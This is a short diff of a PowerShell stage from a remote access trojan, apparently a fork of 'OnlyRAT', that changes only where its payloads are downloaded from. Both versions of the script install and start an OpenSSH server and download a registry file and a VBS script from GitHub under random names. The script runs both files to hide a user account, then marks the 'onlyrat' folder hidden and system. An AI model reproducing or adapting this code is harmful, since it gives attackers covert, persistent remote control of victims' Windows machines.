@@ -42,9 +42,9 @@ Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 $irlpLDVsMf = RpLGWiUsIy
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/hide-user.reg -OutFile "$irlpLDVsMf.reg"
+Invoke-WebRequest -Uri raw.githubusercontent.com/mridul249/RAT/main/payloads/hide-user.reg -OutFile "$irlpLDVsMf.reg"
 $gdOjqHVNDKeg = RpLGWiUsIy
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/confirm-reg.vbs -OutFile "$gdOjqHVNDKeg.vbs"
+Invoke-WebRequest -Uri raw.githubusercontent.com/mridul249/RAT/main/payloads/confirm-reg.vbs -OutFile "$gdOjqHVNDKeg.vbs"
 Invoke-Expression "./$irlpLDVsMf.reg"; Invoke-Expression "./$gdOjqHVNDKeg.vbs"
 Set-Location C:\Users
 attrib +h +s +r onlyrat 
